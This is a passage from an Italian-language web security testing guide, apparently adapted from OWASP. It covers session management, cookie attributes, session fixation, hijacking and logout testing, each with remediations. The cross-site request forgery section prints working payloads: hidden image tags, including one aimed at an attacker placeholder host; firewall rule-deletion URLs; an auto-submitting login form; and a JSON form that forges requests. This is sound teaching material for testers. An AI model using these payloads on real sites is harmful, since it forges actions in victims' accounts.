- Segui le migliori pratiche per memorizzare i token in modo sicuro. Trattali con le stesse considerazioni di sicurezza di altre credenziali.
- Evita i tipi di concessione OAuth deprecati. Vedi "Test per le debolezze di OAuth" per ulteriori dettagli.

### F - Test sulla gestione della sessione
#### 1 - Test per lo schema della gestione della sessione
Uno dei componenti fondamentali di qualsiasi applicazione basata sul web è il meccanismo con cui controlla e mantiene lo stato di un utente che interagisce con essa. 
Quando un utente accede a un'applicazione che deve tenere traccia delle azioni e dell'identità di quell'utente attraverso molteplici richieste, un cookie (o più cookie) viene generato dal server e inviato al client. Il client invierà poi il cookie al server in tutte le connessioni successive fino alla scadenza o alla distruzione del cookie.
A causa dell'importanza dei dati che memorizzano, i cookie sono quindi vitali per la sicurezza complessiva dell'applicazione. Essere in grado di manomettere i cookie può portare al dirottamento delle sessioni di utenti legittimi, all'ottenimento di privilegi più elevati in una sessione attiva e, in generale, all'influenzare le operazioni dell'applicazione in modo non autorizzato.

Solitamente, le fasi principali del modello di attacco sono le seguenti:
* Raccolta di un numero sufficiente di cookies
* Analisi dell'algoritmo di geneazione dei cookies
* Attacco forza bruta sui cookies

Un altro modello di attacco consiste nel sovraccaricare i cookies con l'obiettivo di uscire dall'area di memoria riservata ai cookies e inserire codice malevolo nell'applicazione.

**Come testarlo**
**Black box**
Tutte le interazioni tra il client e l'applicazione dovrebbero essere testate almeno contro i seguenti criteri:
* Tutte le direttive `Set-Cookie` sono contrassegnate come `Secure`?
* Ci sono operazioni sui Cookie che avvengono su trasporto non crittografato?
* Il Cookie può essere forzato su trasporto non crittografato?
* Se sì, come mantiene l'applicazione la sicurezza?
* Ci sono Cookie persistenti?
* Quali tempi di scadenza vengono utilizzati sui cookie persistenti, e sono ragionevoli?
* I cookie che ci si aspetta siano transitori sono configurati come tali?
* Quali impostazioni HTTP/1.1 `Cache-Control` vengono utilizzate per proteggere i Cookie?
* Quali impostazioni HTTP/1.0 `Cache-Control` vengono utilizzate per proteggere i Cookie?

*Raccolta dei cookies*
* Naviga nell'applicazione. Nota quando vengono creati i cookie. Fai un elenco dei cookie ricevuti, la pagina che li imposta (con la direttiva set-cookie), il dominio per cui sono validi, il loro valore e le loro caratteristiche.
* Trova quali cookie rimangono costanti e quali vengono modificati e da quali eventi.
* Scopri quali parti dell'applicazione necessitano di un cookie. Accedi a una pagina, poi prova di nuovo senza il cookie, o con un valore modificato.

*Analisi della sessione*
I token di sessione dovrebbeo essere testati rispetto alla loro casualità, unicità, resistenza all'analisi statistica e crittografica.
La prima fase è esaminare la struttura e il contenuto di un ID di Sessione fornito dall'applicazione. Se l'ID di Sessione è in chiaro, la struttura e i dati pertinenti potrebbero essere immediatamente evidenti, come `192.168.100.1:owaspuser:password:15:58`
Va analizzata anche la struttura di un cookie: se è a 32 bit e i primi 16 sono statistici e i secondi 16 variabili, so che la mia sicurezza è tanto buona quanto l'imprevidibilità di quei 16.     

*Prevedibilità e casualità segli ID si sessione*
Queste analisi possono essere eseguite manualmente e con strumenti statistici o crittanalitici personalizzati o OTS per dedurre eventuali schemi nel contenuto dell'ID di Sessione. I controlli manuali dovrebbero includere confronti di ID di Sessione emessi per le stesse condizioni di accesso – ad esempio, lo stesso nome utente, password e indirizzo IP.
Il tempo è un fattore importante che deve essere anche controllato. Dovrebbe essere effettuato un alto numero di connessioni simultanee per raccogliere campioni nella stessa finestra temporale e mantenere costante quella variabile. Anche una quantizzazione di 50ms o meno potrebbe essere troppo grossolana e un campione preso in questo modo potrebbe rivelare componenti basati sul tempo che altrimenti verrebbero persi.

**Reverse engeneering sui cookies**
Ora che il tester ha enumerato i cookie e ha un'idea generale del loro utilizzo, è il momento di esaminare più a fondo i cookie che sembrano interessanti.
Un cookie, per fornire un metodo sicuro di gestione delle sessioni, deve combinare diverse caratteristiche, ciascuna delle quali mira a proteggere il cookie da diverse classi di attacchi.
* **Imprevedibilità**: se un attaccante riesce a indovinare il cookie utilizzato in una sessione attiva di un utente legittimo, sarà in grado di impersonare completamente quell'utente (session hijacking). Per rendere un cookie imprevedibile, possono essere utilizzati valori casuali o crittografia.
* **Resistenza alla manomissione**: un cookie deve resistere a tentativi di modifica malevoli. Se il tester riceve un cookie come IsAdmin=No, è triviale modificarlo per ottenere diritti amministrativi, a meno che l'applicazione non esegua un doppio controllo (ad esempio, aggiungendo al cookie un hash crittografato del suo valore).
* **Scadenza**: un cookie critico deve essere valido solo per un periodo di tempo appropriato e deve essere eliminato dal disco o dalla memoria successivamente per evitare il rischio di essere riprodotto.
* **Flag `secure`**: un cookie il cui valore è critico per l'integrità della sessione dovrebbe avere questo flag attivato per consentirne la trasmissione solo su un canale crittografato, per scoraggiare l'intercettazione.

**Attacchi forza bruta**
Se la variazione degli ID di sessione è relativamente piccola e la validità degli ID di sessione è lunga, la probabilità di un attacco di forza bruta riuscito è molto più alta.

**Gray box**
L'ID di sessione o il cookie emesso al client non dovrebbe essere facilmente prevedibile (evitare algoritmi lineari basati su variabili prevedibili come l'indirizzo IP del client). Si consiglia l'uso di algoritmi crittografici con una lunghezza della chiave di 256 bit.
L'ID di sessione deve avere una lunghezza di almeno 50 caratteri.
Il token di sessione dovrebbe avere un timeout definito.
I cookies persistenti possono essere salvati sul disco ma quelli di sessione vanno salvati sulla RAM per non lasciare traccia ed eliminati alla chiusura del browser.
Negli attributi  dei cookies vanno messi: `Set-cookie: cookie=data; path=/; domain=.aaa.it; secure`(per gli HTTPS), invece per gli HTTP va messo `Set-cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly`

**Rimedi**
* Assicurati che l'applicazione utilizzi sempre HTTPS. I cookie critici dovrebbero avere il flag Secure impostato, in modo che vengano trasmessi solo su connessioni sicure.
* Utilizza il flag `HttpOnly` per i cookie che non devono essere accessibili tramite JavaScript. Questo aiuta a prevenire attacchi di tipo Cross-Site Scripting (XSS).

        res.cookie('sessionId', 'abc123', { httpOnly: true });

* Definisci un periodo di scadenza ragionevole per i cookie persistenti. I cookie di sessione dovrebbero scadere al termine della sessione (es. chiusura del browser).
* Utilizza algoritmi crittografici robusti per generare ID di sessione. Assicurati che siano lunghi e casuali, evitando schemi prevedibili.
* Implementa controlli di validazione lato server per garantire che i dati contenuti nei cookie non possano essere facilmente manomessi. Ad esempio, utilizza firme digitali o hash per verificare l'integrità.
* Limita il numero di tentativi di accesso e implementa misure di rate limiting per proteggere gli ID di sessione da attacchi di forza bruta.
* Utilizza il flag SameSite per limitare l'invio dei cookie alle richieste di origine. Questo riduce il rischio di attacchi Cross-Site Request Forgery (CSRF).

#### 2 - Test per gli attributi dei cookies
Per garantire la sicurezza dei dati dei cookie, l'industria ha sviluppato mezzi per aiutare a proteggere questi cookie e limitare la loro superficie di attacco. I mezzi per proteggere i cookies sono gli `attributi` e i `prefissi`.

**Come testarlo**
Di seguito verrà discussa una descrizione di ogni attributo e prefisso. Il tester dovrebbe convalidare che vengano utilizzati correttamente dall'applicazione. I cookie possono essere esaminati utilizzando un proxy di intercettazione o controllando il "cookie jar" del browser.
* **Attributo `Secure`**: indica al browser di inviare il cookie solo se la richiesta è effettuata su un canale sicuro come HTTPS
* **Attributo `HttpOnly`**: non consente l'accesso al cookie tramite uno script lato client come JavaScript. Non limita l'intera superficie di attacco XSS (Cross Site Scripting) ma riduce enormemente la portata dei vettori di attacco XSS.
* **Attributo `Domain`**: l'attributo Domain viene utilizzato per confrontare il dominio del cookie con il dominio del server per cui viene effettuata la richiesta HTTP. Se il dominio corrisponde o è un sottodominio, verrà controllato successivamente l'attributo path. 
Solo gli host appartenenti al dominio specificato possono impostare un cookie per quel dominio. Inoltre, l'attributo domain non può essere un dominio di primo livello (come ".gov" o ".com") per prevenire che i server impostino cookie arbitrari per un altro dominio.
Ad esempio, se un cookie è impostato da un'applicazione su app.mydomain.com senza alcun attributo domain impostato, il cookie verrebbe reinviato per tutte le richieste successive a app.mydomain.com, ma non ai suoi sottodomini (come hacker.app.mydomain.com) o a otherapp.mydomain.com. Se uno sviluppatore volesse allentare questa restrizione, potrebbe impostare l'attributo domain su mydomain.com. In questo caso, il cookie verrebbe inviato a tutte le richieste per app.mydomain.com e i sottodomini di mydomain.com, come hacker.app.mydomain.com e persino bank.mydomain.com. Se ci fosse un server vulnerabile su un sottodominio (ad esempio, otherapp.mydomain.com) e l'attributo domain fosse impostato in modo troppo lasco (ad esempio, mydomain.com), allora il server vulnerabile potrebbe essere utilizzato per raccogliere cookie (come i token di sessione) su tutto l'ambito di mydomain.com.
* **Attributo `Path`**: l'attributo Path gioca un ruolo importante nella definizione dell'ambito dei cookie in concomitanza con il `domain`. Oltre al dominio, è possibile specificare il percorso URL per cui il cookie è valido. Proprio come con l'attributo domain, se l'attributo path è impostato in modo troppo lasco, potrebbe lasciare l'applicazione vulnerabile ad attacchi da parte di altre applicazioni sullo stesso server. Ad esempio, se l'attributo path fosse impostato sulla radice del server web /, i cookie dell'applicazione verrebbero inviati a ogni applicazione all'interno dello stesso dominio (se più applicazioni risiedono sotto lo stesso server).
* **Attributo `Expires`**: viene usato per
    * impostare cookies consistenti
    * limitare la durata di vita se una sessione dura troppo
    * rimuovere un ookie forzatamente impostandolo su una data passata
* **Attributo `SameSite`**: può avere tre valori
    * *Strict*: il cookie viene inviato solo se la richiesta viene dallo steso sito che ha impostato il cookie (es. sito bancario)
    * *Lax*: Il cookie viene inviato sia dal sito stesso che in caso io clichi su un link per andare su un altro sito (es. sito di e-commerce)
    * *None*: qualunque sito può chiedere prendere il cookie ma questo obbliga la presenza dell'attributo `Secure` (es. social media)

**Prefissi dei cookies**
Per progettazione, i cookie non hanno la capacità di garantire l'integrità e la riservatezza delle informazioni memorizzate in essi. Queste limitazioni rendono impossibile per un server avere fiducia su come sono stati impostati gli attributi di un dato cookie al momento della creazione. Per rimediare a ciò sono stati ideati i prefissi:
* **Prefisso `Host`**: qualsiasi cookie con il prefisso _Host deve rispettare i seguenti requisiti
    * il cookie ha l'attributo `Secure`
    * il cookie deve essere impostato da un URI considerato sicuro dall'agente utente
    * inviato solo all'host che ha impostato il cookie e NON deve includere alcun attributo Domain.
    * il cookie deve essere impostato con l'attributo Path con un valore di / in modo che venga inviato con ogni richiesta all'host.

        ```Set-Cookie: __Host-cookie=valore; Path=/; Secure; HttpOnly```

* **Prefisso `Secure`**: qualsiasi cookie con il prefisso _Secure deve rispettare i seguenti requisiti:
    * il cookie ha l'attributo `Secure`
    * il cookie deve essere impostato da un URI considerato sicuro dall'agente utente

In generale è sempre meglio mettere più restrizioni possibili e toglierle via via in base al tipo di sito che stiamo costruendo e alle sue esigenze.

**Rimedio**
* Assicurati di utilizzare gli attributi e i prefissi corretti per i cookies in base alle esigenze

#### 3 - Test per Sessin Fixation
La session fixation è facilitata dalla pratica insicura di mantenere lo stesso valore dei cookie di sessione prima e dopo l'autenticazione. Questo avviene tipicamente quando i cookie di sessione vengono utilizzati per memorizzare informazioni di stato anche prima del login, ad esempio, per aggiungere articoli a un carrello della spesa prima di autenticarsi per il pagamento.
Questo problema può essere risolto aggiornando i cookie di sessione dopo il processo di autenticazione.
In alternativa, l'attacco può essere prevenuto assicurando l'integrità dei cookie di sessione con _Host o _Secure.

L'attacco basato su session fixation funziona se l'attaccante riesce a far cliccare un link (o comunque a far visitare una pagina controllata da lui) all'utente prima che questo si autentichi per poi mantenerne il controllo una volta autenticato.

**Come testarlo**
Richiedere

    GET / HTTP/1.1
    Host: www.example.com

per ottenere la seguente risposta

    HTTP/1.1 200 OK
    Date: Wed, 14 Aug 2008 08:45:11 GMT
    Server: IBM_HTTP_Server
    Set-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure
    Cache-Control: no-cache="set-cookie,set-cookie2"
    Expires: Thu, 01 Dec 1994 16:00:00 GMT
    Keep-Alive: timeout=5, max=100
    Connection: Keep-Alive
    Content-Type: text/html;charset=Cp1254
    Content-Language: en-US

L'applicazione imposta un nuovo identificatore di sessione, `JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1`, per il client.

Successivamente, se il tester si autentica con successo all'applicazione con il seguente POST a `https://www.example.com/authentication.php`:

    POST /authentication.php HTTP/1.1
    Host: www.example.com
    [...]
    Referer: http://www.example.com
    Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1
    Content-Type: application/x-www-form-urlencoded
    Content-length: 57

    Name=Meucci&wpPassword=secret!&wpLoginattempt=Log+in

Il tester osserva la seguente risposta dal server:

    HTTP/1.1 200 OK
    Date: Thu, 14 Aug 2008 14:52:58 GMT
    Server: Apache/2.2.2 (Fedora)
    X-Powered-By: PHP/5.1.6
    Content-language: en
    Cache-Control: private, must-revalidate, max-age=0
    X-Content-Encoding: gzip
    Content-length: 4090
    Connection: close
    Content-Type: text/html; charset=UTF-8
    ...
    Dati HTML
    ...

Poiché non è stato emesso alcun nuovo cookie al momento dell'autenticazione riuscita, il tester sa che è possibile eseguire un attacco di session hijacking a meno che non venga garantita l'integrità del cookie di sessione.

**Test con cookie forzati**
Questa strategia di test è mirata agli attaccanti di rete, quindi deve essere applicata solo a siti senza adozione completa di HSTS (i siti con adozione completa di HSTS sono sicuri, poiché tutti i loro cookie hanno integrità).
Simuliamo uno scenario in cui l'attaccante fornisce nel browser della vittima tutti i cookie che non sono stati emessi di recente dopo il login e non hanno integrità. Dopo il login della vittima, l'attaccante presenta i cookie forzati al sito per accedere all'account della vittima: se sono sufficienti per agire per conto della vittima, la session fixation è possibile.
Ecco i passaggi per eseguire il test:
1. Accedere alla pagina di login del sito.
2. Salvare un'istantanea del barattolo dei cookie prima del login, escludendo i cookie che contengono il prefisso __Host- o __Secure- nel loro nome.
3. Effettuare il login sul sito come vittima e raggiungere qualsiasi pagina che offra una funzione sicura che richiede autenticazione.
4. Impostare il barattolo dei cookie sull'istantanea presa al passo 2.
5. Attivare la funzione sicura identificata al passo 3.
6. Osservare se l'operazione al passo 5 è stata eseguita con successo. Se sì, l'attacco è riuscito.
7. Cancellare il barattolo dei cookie, effettuare il login come attaccante e raggiungere la pagina al passo 3.
8. Scrivere nel barattolo dei cookie, uno alla volta, i cookie salvati al passo 2.
9. Attivare nuovamente la funzione sicura identificata al passo 3.
10. Cancellare il barattolo dei cookie e fare di nuovo il login come vittima.
11. Osservare se l'operazione al passo 9 è stata eseguita con successo nell'account della vittima. Se sì, l'attacco è riuscito; altrimenti, il sito è sicuro contro la session fixation.

Si consiglia di utilizzare due macchine o browser diversi per la vittima e l'attaccante. Questo riduce il numero di falsi positivi se l'applicazione web esegue fingerprinting per verificare l'accesso abilitato da un dato cookie. Una variante più breve ma meno precisa della strategia di test richiede solo un account di test. Segue gli stessi passaggi, ma si ferma al passo 6.

**Rimedio**
* Implementare un rinnovo del token di sessione dopo che un utente si autentica con successo.
* L'applicazione dovrebbe sempre prima invalidare l'ID di sessione esistente prima di autenticare un utente e, se l'autenticazione ha successo, fornire un altro ID di sessione.

#### 4 - Test per variabili di sessione esposte
Se i token di sessione (cookie, ID di sessione, campi nascosti) vengono esposti, un attaccante potrebbe impersonare la vittima e accedere all'applicazione in modo illegittimo.

Utilizzando un proxy personale è possibile determinare i seguenti aspetti di ogni richiesta e risosta: protocollo utilizzato, headers HTTP, corpo del messaggio.

**Come testarlo**
**Verifica delle vulnerabilità di crittografia e il riutilizzo dei token di sessione**
La protezione contro le intercettazioni viene spesso fornita dalla crittografia TLS, ma potrebbe includere anche altri metodi di tunneling o crittografia. È importante separare la crittografia o il hashing crittografico dell'ID di sessione dalla crittografia del trasporto, poiché è l'ID di sessione che deve essere protetto, non necessariamente i dati rappresentati da esso.
Quindi, deve essere garantito che la crittografia sia attiva e obbligatoria per ogni richiesta o risposta che contiene l'ID di sessione, indipendentemente dal meccanismo usato (es. un campo nascosto nel form).
Controlli da effettuare:
* Sostituire "https://" con "http://" durante l'interazione con l'applicazione per vedere se viene mantenuta la separazione tra siti sicuri e non sicuri.
* Assicurarsi che, ogni volta che l'autenticazione ha successo, l'utente riceva:
    * Un token di sessione differente
    * Un token inviato tramite un canale crittografato in ogni richiesta HTTP

**Verifica delle Vulnerabilità legate a Proxy e Caching**
Verifiche:
* L'ID di sessione non dovrebbe mai essere trasmesso su un trasporto non crittografato né memorizzato nella cache.
* Controllare che le comunicazioni crittografate siano la configurazione predefinita e obbligatoria per ogni trasferimento di ID di sessione.
* Le direttive di cache come Expires: 0 e Cache-Control: max-age=0 devono essere applicate a ogni richiesta/richiesta che coinvolge i dati di ID di sessione.

**Verifica delle vulnerabilità GET e POST**
Le richieste GET non dovrebbero essere utilizzate per trasferire ID di sessione, poiché potrebbero essere esposti nei log di proxy o firewall. L'uso dei POST riduce questo rischio.
Controllare che non sia possibile cambiare le richieste POST in GET.

**Rimedi**
* Assicurati che nel passaggio dal backend al frontend i cookies siano crittografati in maniera corretta altrimenti un attaccnte con un proxy potrebbe facilmente impossessarsene.
* Per trasferire questo tipo di informazini sensibili utilizza sempre POST e mai GET

#### 5 - Test per il cross site forgery
Con l'ausilio di tecniche di ingegneria sociale (come l'invio di un link tramite email o chat), un attaccante può forzare gli utenti di un'applicazione web a eseguire azioni a sua scelta. Se la vittima è l'amministratore dell'applicazione, un attacco CSRF può compromettere l'intera applicazione web.

La richiesta GET potrebbe essere inviata dall'utente in vari modi: con l'applicazione web, con l'URL o con un link esterno che punta all'URL.
Queste invocazioni sono indistinguibili per l'applicazione. Se l'utente dovesse cliccare inavvertitamente sul link, con una richiesta GET l'attaccante potrebbe fare azioni malevole coi suoi dati.
Utilizzando un tag come `<img>`, non è nemmeno necessario che l'utente clicchi un link. Se un attaccante invia una email contenente un URL con il seguente HTML semplificato:

    <html>
    <body>
        <img src="https://www.company.example/action" width="0" height="0">
    </body>
    </html>

Quando il browser visualizza la pagina, tenterà di caricare l'immagine invisibile da https://www.company.example, inviando automaticamente una richiesta all'applicazione. Non è importante che l'URL dell'immagine non si riferisca a una vera immagine, poiché la richiesta sarà comunque inviata. Questo succede a meno che il download delle immagini non sia disabilitato nel browser. 

Questa vulnerabilità è sfruttabile in tutte le situazioni in cui un attaccante può indurre l'utente a interagire con l'applicazione.

In ambienti integrati mail/browser, anche la sola visualizzazione di un'email contenente un riferimento a un'immagine può generare la richiesta, come mostrato nell'esempio seguente:

    <img src="https://[attacker]/picture.gif" width="0" height="0">

Anche le applicazioni che si basano sull'autenticazione HTTP (firewall) e non sui cookie sono vulnerabili.
Supponiamo che la vittima sia autenticata a una console di gestione del firewall, che ha una funzione per eliminare una regola specifica. Una richiesta GET potrebbe essere simile a:

    https://[target]/fwmgt/delete?rule=1
    
O eliminare tutte le regole con:

    https://[target]/fwmgt/delete?rule=*
    
L'attaccante può indurre l'utente a inviare queste richieste tramite vari metodi, come l'inclusione di un tag `<img>`.

**Obiettivo del test**
Controllare se è possibile fare richieste a nome di un utente senza il suo intervento

**Come testarlo**
Verificare se la gestione della sessione dell'applicazione dipende solo da valori lato client (cookie o credenziali HTTP). Le risorse accessibili tramite richieste GET sono particolarmente vulnerabili, ma anche le richieste POST possono essere sfruttate.
Un esempio di codice per sfruttare una richiesta POST potrebbe essere:

    <html>
    <body onload='document.CSRF.submit()'>
    <form action='http://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'>
        <input type='hidden' name='name' value='Hacked'>
        <input type='hidden' name='password' value='Hacked'>
    </form>
    </body>
    </html>

Qui il form viene inviato automaticamente con `onload='document.CSRF.submit()'`.
Se si utilizzano payload JSON, è possibile sfruttare CSRF con un form autoinviato modificando il tipo di codifica a "text/plain":

    <html>
    <body>
    <script>history.pushState('', '', '/')</script>
    <form action='http://victimsite.com' method='POST' enctype='text/plain'>
        <input type='hidden' name='{"name":"hacked","password":"hacked","padding":"'value='something"}' />
        <input type='submit' value='Submit request' />
    </form>
    </body>
    </html>

Avendo modificato la codifica, quello che si otterà ora dalla richiesta POST sarà: 

    POST / HTTP/1.1
    Host: victimsite.com
    Content-Type: text/plain

    {"name":"hacked","password":"hacked","padding":"=something"}

Per la prevenzione di ciò controllare l'[OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

**Rimedi**
* Generare un token univoco per ogni sessione utente e includerlo in ogni modulo o richiesta che modifica lo stato dell'applicazione. Questo token deve essere validato dal server al momento della ricezione della richiesta.
* Utilizzare il flag SameSite per i cookie, che limita l'invio dei cookie solo a richieste provenienti dallo stesso sito, riducendo la possibilità che vengano inviati in contesti cross-origin.

#### 6 - Test per le funzionalità di logout
Una terminazione sicura della sessione richiede almeno i seguenti componenti:
* Disponibilità di controlli dell'interfaccia utente che consentano all'utente di effettuare il logout manualmente.
* Terminazione della sessione dopo un certo periodo di inattività (timeout della sessione).
* Invalidazione adeguata dello stato della sessione sul lato server.

Framework di alcune applicazioni web si basano esclusivamente sul cookie di sessione per identificare l'utente connesso. L'ID dell'utente è incorporato nel valore del cookie (cifrato). Il server dell'applicazione non esegue alcun tracciamento sul lato server della sessione. Quando si effettua il logout, il cookie di sessione viene rimosso dal browser. Tuttavia, poiché l'applicazione non esegue alcun tracciamento, non sa se una sessione è disconnessa o meno. Quindi, riutilizzando un cookie di sessione, è possibile accedere alla sessione autenticata. Un esempio ben noto di questo è la funzionalità di Forms Authentication in ASP.NET.

Gli utenti dei browser web spesso non si preoccupano che un'applicazione sia ancora aperta e chiudono semplicemente il browser o una scheda. Un'applicazione web dovrebbe essere consapevole di questo comportamento e terminare automaticamente la sessione sul lato server dopo un periodo di tempo definito.

L'uso di un sistema di Single Sign-On (SSO) anziché di uno schema di autenticazione specifico per l'applicazione spesso causa la coesistenza di più sessioni che devono essere terminate separatamente. Ad esempio, la terminazione della sessione specifica dell'applicazione non termina la sessione nel sistema SSO. Navigando nuovamente al portale SSO, l'utente ha la possibilità di effettuare nuovamente il login all'applicazione da cui si è disconnesso poco prima. D'altro canto, una funzione di logout in un sistema SSO non provoca necessariamente la terminazione della sessione nelle applicazioni collegate.

**Come testarlo**
**Interfaccia di logout**
Controllare che in ogni pagina dell'applicazione web sia presente il tasto di logout ben visibile e che questo stia sempre nella visuale dell'utente.

**Test della terminazione della sessione lato server**
Per prima cosa, memorizzare i valori dei cookie utilizzati per identificare una sessione. Attivare la funzione di logout e osservare il comportamento dell'applicazione, in particolare riguardo ai cookie di sessione. Provare a navigare verso una pagina visibile solo in una sessione autenticata, ad esempio utilizzando il pulsante di "indietro" del browser. Se viene visualizzata una versione cache della pagina, utilizzare il pulsante di ricarica per aggiornare la pagina dal server. Se la funzione di logout fa sì che i cookie di sessione vengano impostati a un nuovo valore, ripristinare il valore precedente dei cookie di sessione e ricaricare una pagina dall'area autenticata dell'applicazione. Se questi test non mostrano vulnerabilità su una pagina particolare, provare almeno alcune altre pagine dell'applicazione considerate critiche per la sicurezza, per garantire che la terminazione della sessione venga riconosciuta correttamente in queste aree dell'applicazione.

**Test del timeout di sessione**
Cercare di determinare un timeout della sessione effettuando richieste a una pagina nell'area autenticata dell'applicazione web con ritardi crescenti. Se appare il comportamento di logout, il ritardo utilizzato corrisponde approssimativamente al valore del timeout della sessione.
I risultati attesi dal test della terminazione della sessione sul lato server, descritti in precedenza, sono simili a quelli di un logout causato da un timeout di inattività.

**Test della terminazione della sessione in ambienti di single sign-on**
Eseguire un logout nell'applicazione testata. Verificare se esiste un portale centrale o un directory di applicazione che consente all'utente di effettuare nuovamente il login all'applicazione senza autenticazione. Testare se l'applicazione richiede all'utente di autenticarsi se viene richiesta l'URL di un punto di accesso all'applicazione. Mentre si è autenticati nell'applicazione testata, eseguire un logout nel sistema SSO. Poi, provare ad accedere a un'area autenticata dell'applicazione testata.
Si prevede che l'attivazione di una funzione di logout in un'applicazione web collegata a un sistema SSO o nel sistema SSO stesso provochi la terminazione globale di tutte le sessioni. Dovrebbe essere richiesta un'autenticazione dell'utente per accedere all'applicazione dopo il logout nel sistema SSO e nell'applicazione collegata.

**Rimedio**
* Controlla che il bottone di logout sia sempre visibile sullo schermo dell'utente

#### 7 - Test per il timeout della sessione
**Black box**
Poi, se il timeout è configurato, i tester devono capire se il timeout è forzato dal client o dal server (o entrambi). Se il cookie di sessione non è persistente (o, più in generale, il cookie di sessione non memorizza alcun dato relativo al tempo), i tester possono presumere che il timeout sia forzato dal server. Se il cookie di sessione contiene dati relativi al tempo (ad esempio, tempo di accesso, ultimo accesso o data di scadenza per un cookie persistente), allora è possibile che il client sia coinvolto nell'applicazione del timeout. In questo caso, i tester potrebbero provare a modificare il cookie (se non è protetto crittograficamente) e vedere cosa succede alla sessione. Ad esempio, i tester possono impostare la data di scadenza del cookie lontano nel futuro e verificare se la sessione può essere prolungata.

Come regola generale, tutto dovrebbe essere controllato lato server e non dovrebbe essere possibile, ripristinando i cookie di sessione a valori precedenti, accedere nuovamente all'applicazione.

**Grey box**
Il tester deve verificare che:
* La funzione di logout distrugga effettivamente tutti i token di sessione o almeno li renda inutilizzabili.
* Il server esegue controlli adeguati sullo stato della sessione, impedendo a un attaccante di riutilizzare identificatori di sessione precedentemente distrutti.
* Un timeout è applicato e viene correttamente imposto dal server.

Si noti che la cosa più importante è che l'applicazione invalidi la sessione lato server.

**Rimedio**
* Imposta un tempo di scadenza della sessione adeguato al tipo di utilizzo che deve esserne fatto: nè troppo lungo nè troppo breve e imposta un modo per il refresh del timer in modo che questo si avvii solamente in caso di inutilizzo della pagina (per non cacciare fuori dalla pagina un utente nel mezzo di un'operazione)

#### 8 - Test per il puzzling delle sessioni
Il sovraccarico delle variabili di sessione (noto anche come Session Puzzling) è una vulnerabilità a livello di applicazione che può consentire a un attaccante di eseguire una serie di azioni malevole, tra cui, ma non limitate a:
* Bypassare meccanismi di autenticazione efficaci e impersonare utenti legittimi.
* Elevare i privilegi di un account utente malevolo in un ambiente che altrimenti sarebbe considerato a prova di errore.
* Saltare fasi di qualificazione in processi multi-fase, anche se il processo include tutte le restrizioni comunemente raccomandate a livello di codice.
* Manipolare valori lato server in modi indiretti che non possono essere previsti o rilevati.
* Eseguire attacchi tradizionali in posizioni precedentemente irraggiungibili o addirittura considerate sicure.

Questa vulnerabilità si verifica quando un'applicazione utilizza la stessa variabile di sessione per più di un fine. Un attaccante può potenzialmente accedere a pagine in un ordine non anticipato dagli sviluppatori, in modo che la variabile di sessione venga impostata in un contesto e poi utilizzata in un altro.

Ad esempio, un attaccante potrebbe utilizzare il sovraccarico delle variabili di sessione per bypassare i meccanismi di enforcement dell'autenticazione di applicazioni che verificano l'esistenza di variabili di sessione contenenti valori relativi all'identità, di solito memorizzati nella sessione dopo un processo di autenticazione riuscito. Ciò significa che un attaccante prima accede a una posizione nell'applicazione che imposta il contesto della sessione e poi accede a posizioni privilegiate che esaminano questo contesto.

Un esempio di vettore d'attacco per il bypass dell'autenticazione potrebbe essere eseguito accedendo a un punto di ingresso pubblicamente accessibile (ad esempio, una pagina di recupero password) che popola la sessione con una variabile di sessione identica, basata su valori fissi o su input provenienti dall'utente.

*Esempio pratico* 
Immagina che un'applicazione usi una variabile di sessione chiamata userId. In un contesto, questa variabile è impostata quando un utente si autentica e contiene l'ID dell'utente legittimo. Tuttavia, se la stessa variabile userId viene utilizzata anche in altre parti dell'applicazione per scopi diversi (come il recupero di dati o per gestire sessioni temporanee), un attaccante potrebbe:
* Accedere a una pagina che non richiede l'autenticazione, impostando userId in un modo che non dovrebbe essere consentito.
* Utilizzare questa variabile per accedere a pagine riservate, sfruttando il fatto che l'applicazione non controlla correttamente il contesto in cui userId è stato impostato.

**Come testarlo**
**Black box**
Questa vulnerabilità può essere rilevata e sfruttata enumerando tutte le variabili di sessione utilizzate dall'applicazione e in quale contesto sono valide. In particolare, è possibile accedere a una sequenza di punti di ingresso e poi esaminare i punti di uscita. Nel caso del testing black-box, questa procedura è difficile e richiede un po' di fortuna, poiché ogni sequenza diversa potrebbe portare a un risultato diverso.

**Grey box**
Guardando il codice sorgente è molto più semplice

**Rimedi**
Le variabili di sessione dovrebbero essere utilizzate solo per un unico scopo.

#### 9 - Test per il session hijacking
Un attaccante che ottiene accesso ai cookie di sessione di un utente può impersonarlo presentando tali cookie. Questo attacco è noto come dirottamento della sessione (session hijacking). 
Per prevenire questo, i cookie di sessione dovrebbero essere contrassegnati con l'attributo Secure in modo che vengano comunicati solo tramite HTTPS.

Da notare che l'attributo Secure dovrebbe essere utilizzato anche quando l'applicazione web è completamente distribuita su HTTPS, altrimenti è possibile il seguente attacco di furto di cookie:
* La vittima invia una richiesta a http://another-site.com
* L'attaccante corrompe la risposta corrispondente in modo che attivi una richiesta a http://example.com
* Il browser ora tenta di accedere a http://example.com
* Anche se la richiesta fallisce, i cookie di sessione vengono esposti in chiaro tramite HTTP

In alternativa, il dirottamento della sessione può essere prevenuto vietando l'uso di HTTP utilizzando HSTS.

Supponiamo che il sito example.com attivi HSTS senza l'opzione includeSubDomains. Il sito emette cookie di sessione con l'attributo Domain impostato su example.com. È possibile il seguente attacco: 
* La vittima invia una richiesta a http://another-site.com
* L'attaccante corrompe la risposta corrispondente in modo che attivi una richiesta a http://fake.example.com
* Il browser ora tenta di accedere a http://fake.example.com, che è permesso dalla configurazione HSTS
* Poiché la richiesta viene inviata a un sotto-dominio di example.com con l'attributo Domain impostato, include i cookie di sessione, che vengono esposti in chiaro tramite HTTP

HSTS completo dovrebbe essere attivato sul dominio apex (dominio principale senza alcun sottodominio) per prevenire questo attacco.
L'adozione completa di HSTS è descritta in un documento chiamato "Testing for Integrity Flaws in Web Sessions" di Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo e Michele Bugliesi. 

**Come testarlo**
Ecco i passaggi per eseguire questo test:
1. Accedere al sito come vittima e raggiungere qualsiasi pagina che offre una funzione sicura che richiede autenticazione
